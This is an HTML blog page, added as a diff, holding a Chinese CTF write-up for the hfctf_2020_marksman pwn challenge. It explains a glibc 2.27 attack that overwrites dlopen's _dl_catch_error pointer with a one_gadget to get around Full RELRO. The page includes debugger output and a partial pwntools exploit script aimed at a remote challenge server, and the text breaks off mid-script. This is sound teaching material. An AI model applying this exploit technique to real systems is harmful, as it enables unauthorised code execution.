@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="hfctf_2020_marksman   两次输入     64位，dynamically，全开    有两次输入，第一次输入“16字节”，第二次输入“3字节”（第二次可以分段多次输入） 程序还泄露了“puts”的libc地址，就相当于知晓了“libc_base”   如果符合if条件，第二次输入的值会进行覆盖 入侵思路 程序的思路十分简单：  在第一次输入中写入某个地址 在第二次输入中改写该地">
+<meta property="og:type" content="article">
+<meta property="og:title" content="exit_hook+dlopen劫持">
+<meta property="og:url" content="http://example.com/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="hfctf_2020_marksman   两次输入     64位，dynamically，全开    有两次输入，第一次输入“16字节”，第二次输入“3字节”（第二次可以分段多次输入） 程序还泄露了“puts”的libc地址，就相当于知晓了“libc_base”   如果符合if条件，第二次输入的值会进行覆盖 入侵思路 程序的思路十分简单：  在第一次输入中写入某个地址 在第二次输入中改写该地">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/1642595402906.png">
+<meta property="og:image" content="http://example.com/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/1642595429057.png">
+<meta property="og:image" content="http://example.com/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/1642595439603.png">
+<meta property="og:image" content="http://example.com/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/1642597494667.png">
+<meta property="og:image" content="http://example.com/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/1642596168020.png">
+<meta property="og:image" content="http://example.com/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/1642600868884.png">
+<meta property="article:published_time" content="2022-01-20T03:26:32.000Z">
+<meta property="article:modified_time" content="2022-01-20T08:17:47.323Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="hook">
+<meta property="article:tag" content="dlopen">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/1642595402906.png">
+
+<link rel="canonical" href="http://example.com/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>exit_hook+dlopen劫持 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          exit_hook+dlopen劫持
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-01-20 11:26:32 / Modified: 16:17:47" itemprop="dateCreated datePublished" datetime="2022-01-20T11:26:32+08:00">2022-01-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>7.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>7 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>hfctf_2020_marksman</strong></p>
+<p><img src="/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/1642595402906.png" alt="1642595402906"> </p>
+<p>两次输入</p>
+<p><img src="/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/1642595429057.png" alt="1642595429057"> </p>
+<p><img src="/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/1642595439603.png" alt="1642595439603"> </p>
+<p>64位，dynamically，全开</p>
+<p><img src="/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/1642597494667.png" alt="1642597494667">  </p>
+<p>有两次输入，第一次输入“16字节”，第二次输入“3字节”（第二次可以分段多次输入）</p>
+<p>程序还泄露了“puts”的libc地址，就相当于知晓了“libc_base”</p>
+<p><img src="/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/1642596168020.png" alt="1642596168020"> </p>
+<p>如果符合if条件，第二次输入的值会进行覆盖</p>
+<p><strong>入侵思路</strong></p>
+<p>程序的思路十分简单：</p>
+<ul>
+<li>在第一次输入中写入某个地址</li>
+<li>在第二次输入中改写该地址的内容</li>
+<li>只能修改一次地址，所以必须把目标地址改为“one_gadget”</li>
+</ul>
+<p>也有明显的问题：</p>
+<ul>
+<li>程序开了Full RELRO，got表无法被劫持</li>
+<li>程序对输入值进行了限制，多数“one_gadget”被淘汰</li>
+</ul>
+<p>泄露了“puts”的libc地址，可以用LibcSearcher获取libc版本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: ubuntu-glibc (<span class="built_in">id</span> libc6_2<span class="number">.27</span>-3ubuntu1_amd64)</span><br><span class="line"><span class="number">1</span>: ubuntu-old-glibc (<span class="built_in">id</span> libc6_2<span class="number">.3</span><span class="number">.6</span>-0ubuntu20_i386)</span><br></pre></td></tr></table></figure>
+<p>用“glibc-all-in-one”下载对应版本的libc，获取“one_gadget”</p>
+<p>​        // 加 “—level 2” 参数输出所有“one_gadget”</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/tool/glibc-all-in-one/libs/<span class="number">2.27</span><span class="number">-3u</span>buntu1_amd64] git:(master) one_gadget libc<span class="number">-2.27</span>.so --level <span class="number">2</span></span><br><span class="line"><span class="number">0x4f2c5</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; <span class="number">0xf</span> == <span class="number">0</span></span><br><span class="line">  rcx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4f322</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x40</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe569f</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r14, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r14] == <span class="literal">NULL</span> || r14 == <span class="literal">NULL</span></span><br><span class="line">  [r12] == <span class="literal">NULL</span> || r12 == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe5858</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, [rbp<span class="number">-0x88</span>], [rbp<span class="number">-0x70</span>])</span><br><span class="line">constraints:</span><br><span class="line">  [[rbp<span class="number">-0x88</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0x88</span>] == <span class="literal">NULL</span></span><br><span class="line">  [[rbp<span class="number">-0x70</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe585f</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, [rbp<span class="number">-0x70</span>])</span><br><span class="line">constraints:</span><br><span class="line">  [r10] == <span class="literal">NULL</span> || r10 == <span class="literal">NULL</span></span><br><span class="line">  [[rbp<span class="number">-0x70</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe5863</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r10] == <span class="literal">NULL</span> || r10 == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x10a38c</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x10a398</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, [rax])</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [[rax]] == <span class="literal">NULL</span> || [rax] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
+<p>发现 <strong>0xe569f execve(“/bin/sh”, r14, r12)</strong> 刚好符合条件，解决了“one_gadget”的问题</p>
+<p>程序原本的got表不可以写，但一个突破口：<strong>dlopen</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">dlopen</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">int</span> mode)</span></span></span><br></pre></td></tr></table></figure>
+<p>功能：打开一个动态链接库</p>
+<p>参数：file就是libc文件路径，mode只有以下两种常用的值，并且必须指定其一</p>
+<ul>
+<li>RTLD_LAZY：在 dlopen 返回前，对于动态库中存在的未定义的变量 (如外部变量 extern，也可以是函数) 不执行解析，就是不解析这个变量的地址</li>
+<li>RTLD_NOW：与上面不同，他需要在 dlopen 返回前，解析出每个未定义变量的地址，如果解析不出来，在 dlopen 会返回 NULL</li>
+</ul>
+<p>先看一下“dlopen”的源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">dlopen</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> __dlopen (file, mode, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * __dlopen (<span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">int</span> mode DL_CALLER_DECL)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (_dlfcn_hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> _dlfcn_hook-&gt;dlopen (file, mode, DL_CALLER);</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dlopen_args</span> <span class="title">args</span>;</span></span><br><span class="line">  args.file = file;</span><br><span class="line">  args.mode = mode;</span><br><span class="line">  args.caller = DL_CALLER;</span><br><span class="line"> </span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">return</span> _dlerror_run (dlopen_doit, &amp;args) ? <span class="literal">NULL</span> : args.<span class="keyword">new</span>;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">if</span> (_dlerror_run (dlopen_doit, &amp;args))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">  __libc_register_dl_open_hook ((struct link_map *) args.<span class="keyword">new</span>);</span><br><span class="line">  __libc_register_dlfcn_hook ((struct link_map *) args.<span class="keyword">new</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> args.<span class="keyword">new</span>;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/1642600868884.png" alt="1642600868884"></p>
+<p>这就是“dlopen”的调用流程 ，重点注意一下“_dl_open”</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * _dl_open (<span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">int</span> mode, <span class="keyword">const</span> <span class="keyword">void</span> *caller_dlopen, Lmid_t nsid, <span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], <span class="keyword">char</span> *env[])</span><br><span class="line">&#123;</span><br><span class="line">    ……</span><br><span class="line">    ……</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Never allow loading a DSO in a namespace which is empty.  Such</span></span><br><span class="line"><span class="comment">     direct placements is only causing problems.  Also don&#x27;t allow</span></span><br><span class="line"><span class="comment">     loading into a namespace used for auditing.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (__builtin_expect (nsid != LM_ID_BASE &amp;&amp; nsid != __LM_ID_CALLER, <span class="number">0</span>)</span><br><span class="line">	   &amp;&amp; (GL(dl_ns)[nsid]._ns_nloaded == <span class="number">0</span></span><br><span class="line">	       || GL(dl_ns)[nsid]._ns_loaded-&gt;l_auditing))</span><br><span class="line">    _dl_signal_error (EINVAL, file, <span class="literal">NULL</span>,</span><br><span class="line">		      N_(<span class="string">&quot;invalid target namespace in dlmopen()&quot;</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ((nsid == LM_ID_BASE || nsid == __LM_ID_CALLER)</span><br><span class="line">	   &amp;&amp; GL(dl_ns)[LM_ID_BASE]._ns_loaded == <span class="literal">NULL</span></span><br><span class="line">	   &amp;&amp; GL(dl_nns) == <span class="number">0</span>)</span><br><span class="line">    GL(dl_nns) = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dl_open_args</span> <span class="title">args</span>;</span></span><br><span class="line">  args.file = file;</span><br><span class="line">  args.mode = mode;</span><br><span class="line">  args.caller_dlopen = caller_dlopen;</span><br><span class="line">  args.caller_dl_open = RETURN_ADDRESS (<span class="number">0</span>);</span><br><span class="line">  args.<span class="built_in">map</span> = <span class="literal">NULL</span>;</span><br><span class="line">  args.nsid = nsid;</span><br><span class="line">  args.argc = argc;</span><br><span class="line">  args.argv = argv;</span><br><span class="line">  args.env = env;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *objname;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *errstring;</span><br><span class="line">  <span class="keyword">bool</span> malloced;</span><br><span class="line">  <span class="keyword">int</span> errcode = _dl_catch_error (&amp;objname, &amp;errstring, &amp;malloced, dl_open_worker, &amp;args);</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MAP_COPY</span></span><br><span class="line">  <span class="comment">/* We must munmap() the cache file. */</span></span><br><span class="line">  _dl_unload_cache ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">    ……</span><br><span class="line">    ……</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SHARED</span></span><br><span class="line">  DL_STATIC_INIT (args.<span class="built_in">map</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> args.<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​        // 其中的“_dl_catch_error”就是劫持的对象</p>
+<p>“dlopen”里面有调用libc函数的地方，于是劫持它的got表，便可以getshell </p>
+<p>可以把“_dl_catch_error”的内容，覆写为“one gadget”，这样调用“dlopen”的时候就会调用“one gadget”，解决了got表不可写的问题</p>
+<p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/hi_clare/topics/1375839">dlopen 在Linux C/C++用法详解</a> </li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/SweeNeil/article/details/83744843">Linux动态库加载函数dlopen源码梳理</a> </li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/MCSFX/p/10958790.html">“#if…#endif” 的用法总结</a></li>
+</ul>
+<p><strong>动态调试</strong></p>
+<p>“_dl_catch_error”的具体地址可以在GDB中查看：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555400D63</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555400d63</span> ◂— call   <span class="number">0x555555400860</span>	<span class="comment">//dlopen</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555400d6b</span> ◂— jne    <span class="number">0x555555400d77</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x555555400d73</span> ◂— sbb    ebx, edi</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x555555400d7b</span> ◂— add    eax, dword ptr [rax]</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x555555400d83</span> ◂— mov    eax, <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555400860</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555400860</span> (dlopen@plt) ◂— jmp    qword ptr [rip + <span class="number">0x201732</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555400868</span> (dlopen@plt+<span class="number">8</span>) ◂— add    byte ptr [rax], al</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x555555400870</span> (setvbuf@plt) ◂— jmp    qword ptr [rip + <span class="number">0x20172a</span>]</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x555555400878</span> (setvbuf@plt+<span class="number">8</span>) ◂— add    byte ptr [rax], al</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x555555400880</span> (atol@plt) ◂— jmp    qword ptr [rip + <span class="number">0x201722</span>]</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x555555400888</span> (atol@plt+<span class="number">8</span>) ◂— add    byte ptr [rax], al</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x555555400890</span> (<span class="built_in">exit</span>@plt) ◂— jmp    qword ptr [rip + <span class="number">0x20171a</span>]</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x555555400898</span> (<span class="built_in">exit</span>@plt+<span class="number">8</span>) ◂— add    byte ptr [rax], al</span><br></pre></td></tr></table></figure>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;117.21.200.166&#x27;</span>,<span class="number">26233</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./hfctf_2020_marksman&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./hfctf_2020_marksman&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;I placed the target near: &#x27;</span>)</span><br><span class="line">puts_libc=<span class="built_in">eval</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">success(<span class="string">&#x27;puts_libc &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(puts_libc))</span><br><span class="line"></span><br><span class="line">obj=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_libc)</span><br><span class="line">libc_base=puts_libc-obj.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">_dl_catch_error_libc=libc_base + <span class="number">0x5f4038</span></span><br><span class="line">one_gadget=libc_base + <span class="number">0xe569f</span></span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&#x27;_dl_catch_error_libc &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(_dl_catch_error_libc))</span><br><span class="line">success(<span class="string">&#x27;one_gadget &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span 